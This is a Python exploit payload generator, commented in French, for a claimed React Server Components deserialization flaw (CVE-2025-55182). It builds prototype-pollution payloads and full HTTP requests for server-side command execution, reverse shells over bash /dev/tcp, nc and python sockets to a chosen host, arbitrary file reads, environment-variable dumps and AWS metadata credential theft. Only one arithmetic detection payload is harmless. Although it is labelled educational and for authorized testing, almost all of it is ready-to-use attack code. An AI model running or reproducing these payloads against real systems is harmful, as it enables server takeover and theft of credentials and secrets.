#!/usr/bin/env python3
"""
CVE-2025-55182 (React2Shell) - Générateur de Payload

Génère divers payloads d'exploitation pour différents scénarios d'attaque.
Utile pour comprendre les mécanismes de la vulnérabilité.

À DES FINS ÉDUCATIVES ET DE TESTS AUTORISÉS UNIQUEMENT.

Utilisation :
    python3 payload_generator.py --type basic --cmd "id"
    python3 payload_generator.py --type reverse-shell --lhost 10.0.0.1 --lport 4444
    python3 payload_generator.py --type file-read --file /etc/passwd
    python3 payload_generator.py --type env-dump
"""

import argparse
import json
import base64
import sys

BANNER = """
╔═══════════════════════════════════════════════════════════════╗
║       Générateur de Payload CVE-2025-55182                    ║
║                                                               ║
║  Générer des payloads d'exploit pour divers scénarios         ║
╚═══════════════════════════════════════════════════════════════╝
"""


def generate_basic_rce(command: str) -> dict:
    """Générer un payload d'exécution de commande basique."""
    escaped = command.replace("'", "\\'").replace('"', '\\"')
    
    return {
        "then": "$1:__proto__:then",
        "status": "resolved_model",
        "reason": -1,
        "value": '{"then":"$B1337"}',
        "_response": {
            "_prefix": (
                f"var res=process.mainModule.require('child_process')"
                f".execSync('{escaped}',{{'timeout':10000}})"
                f".toString().trim();"
                f";throw Object.assign(new Error('NEXT_REDIRECT'), {{digest:`${{res}}`}});"
            ),
            "_chunks": "$Q2",
            "_formData": {
                "get": "$1:constructor:constructor"
            }
        }
    }


def generate_reverse_shell(lhost: str, lport: int, shell_type: str = "bash") -> dict:
    """Générer un payload de reverse shell."""
    
    if shell_type == "bash":
        shell_code = (
            f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
        )
    elif shell_type == "nc":
        shell_code = (
            f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f"
        )
    elif shell_type == "python":
        shell_code = (
            f"python3 -c 'import socket,subprocess,os;"
            f"s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
            f"s.connect((\"{lhost}\",{lport}));"
            f"os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
            f"subprocess.call([\"/bin/sh\",\"-i\"])'"
        )
    else:
        shell_code = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
    
    # Encodage Base64 pour un transport plus sûr
    encoded = base64.b64encode(shell_code.encode()).decode()
    
    return {
        "then": "$1:__proto__:then",
        "status": "resolved_model",
        "reason": -1,
        "value": '{"then":"$B1337"}',
        "_response": {
            "_prefix": (
                f"process.mainModule.require('child_process')"
                f".execSync('echo {encoded}|base64 -d|bash');"
            ),
            "_chunks": "$Q2",
            "_formData": {
                "get": "$1:constructor:constructor"
            }
        }
    }


def generate_file_read(filepath: str) -> dict:
    """Générer un payload de lecture/exfiltration de fichier."""
    escaped = filepath.replace("'", "\\'")
    
    return {
        "then": "$1:__proto__:then",
        "status": "resolved_model",
        "reason": -1,
        "value": '{"then":"$B1337"}',
        "_response": {
            "_prefix": (
                f"var fs=process.mainModule.require('fs');"
                f"var content=fs.readFileSync('{escaped}','utf8').substring(0,4000);"
                f"throw Object.assign(new Error('NEXT_REDIRECT'), {{digest:content}});"
            ),
            "_chunks": "$Q2",
            "_formData": {
                "get": "$1:constructor:constructor"
            }
        }
    }


def generate_env_dump() -> dict:
    """Générer un payload de dump des variables d'environnement."""
    return {
        "then": "$1:__proto__:then",
        "status": "resolved_model",
        "reason": -1,
        "value": '{"then":"$B1337"}',
        "_response": {
            "_prefix": (
                "var env=JSON.stringify(process.env).substring(0,4000);"
                "throw Object.assign(new Error('NEXT_REDIRECT'), {digest:env});"
            ),
            "_chunks": "$Q2",
            "_formData": {
                "get": "$1:constructor:constructor"
            }
        }
    }


def generate_aws_metadata() -> dict:
    """Générer un payload d'exfiltration des métadonnées AWS."""
    return {
        "then": "$1:__proto__:then",
        "status": "resolved_model",
        "reason": -1,
        "value": '{"then":"$B1337"}',
        "_response": {
            "_prefix": (
                "var cp=process.mainModule.require('child_process');"
                "var role=cp.execSync('curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/').toString();"
                "var creds=cp.execSync('curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/'+role).toString();"
                "throw Object.assign(new Error('NEXT_REDIRECT'), {digest:creds});"
            ),
            "_chunks": "$Q2",
            "_formData": {
                "get": "$1:constructor:constructor"
            }
        }
    }


def generate_safe_detection() -> dict:
    """Générer un payload de détection sûr (arithmétique uniquement)."""
    return {
        "then": "$1:__proto__:then",
        "status": "resolved_model",
        "reason": -1,
        "value": '{"then":"$B1337"}',
        "_response": {
            "_prefix": (
                "var res=String(7*7+1);"
                "throw Object.assign(new Error('NEXT_REDIRECT'), {digest:res});"
            ),
            "_chunks": "$Q2",
            "_formData": {
                "get": "$1:constructor:constructor"
            }
        }
    }


def build_full_request(payload: dict, target: str = "CIBLE") -> str:
    """Construire la requête HTTP complète avec le payload."""
    boundary = "WebKitFormBoundaryx8jO2oVc6SWP3Sad"
    payload_json = json.dumps(payload)
    
    body = f"""------{boundary}
Content-Disposition: form-data; name="0"

{payload_json}
------{boundary}
Content-Disposition: form-data; name="1"

"$@0"
------{boundary}
Content-Disposition: form-data; name="2"

[]
------{boundary}--"""

    request = f"""POST / HTTP/1.1
Host: {target}
User-Agent: Mozilla/5.0 (Security Research)
Next-Action: x
Content-Type: multipart/form-data; boundary=----{boundary}
Content-Length: {len(body)}

{body}"""
    
    return request


def main():
    print(BANNER)
    
    parser = argparse.ArgumentParser(description='Générateur de Payload CVE-2025-55182')
    parser.add_argument('--type', '-t', required=True,
                       choices=['basic', 'reverse-shell', 'file-read', 'env-dump', 
                               'aws-metadata', 'detection'],
                       help='Type de payload à générer')
    parser.add_argument('--cmd', '-c', help='Commande pour RCE basique')
    parser.add_argument('--lhost', help='Hôte écouteur pour reverse shell')
    parser.add_argument('--lport', type=int, default=4444, help='Port écouteur')
    parser.add_argument('--shell', default='bash',
                       choices=['bash', 'nc', 'python'],
                       help='Type de shell pour reverse shell')
    parser.add_argument('--file', '-f', help='Chemin du fichier pour lecture de fichier')
    parser.add_argument('--target', default='localhost:3000',
                       help='Cible pour le formatage de la requête HTTP')
    parser.add_argument('--json-only', action='store_true',
                       help='Sortir uniquement le payload JSON')
    
    args = parser.parse_args()
    
    # Générer le payload basé sur le type
    if args.type == 'basic':
        if not args.cmd:
            print("[-] --cmd requis pour le payload basique")
            sys.exit(1)
        payload = generate_basic_rce(args.cmd)
        
    elif args.type == 'reverse-shell':
        if not args.lhost:
            print("[-] --lhost requis pour reverse shell")
            sys.exit(1)
        payload = generate_reverse_shell(args.lhost, args.lport, args.shell)
        
    elif args.type == 'file-read':
        if not args.file:
            print("[-] --file requis pour le payload de lecture de fichier")
            sys.exit(1)
        payload = generate_file_read(args.file)
        
    elif args.type == 'env-dump':
        payload = generate_env_dump()
        
    elif args.type == 'aws-metadata':
        payload = generate_aws_metadata()
        
    elif args.type == 'detection':
        payload = generate_safe_detection()
    
    # Sortie
    if args.json_only:
        print(json.dumps(payload, indent=2))
    else:
        print(f"[*] Type de Payload : {args.type}")
        print(f"[*] Cible : {args.target}")
        print("")
        print("=" * 60)
        print("PAYLOAD JSON :")
        print("=" * 60)
        print(json.dumps(payload, indent=2))
        print("")
        print("=" * 60)
        print("REQUÊTE HTTP COMPLÈTE :")
        print("=" * 60)
        print(build_full_request(payload, args.target))


if __name__ == "__main__":
    main()
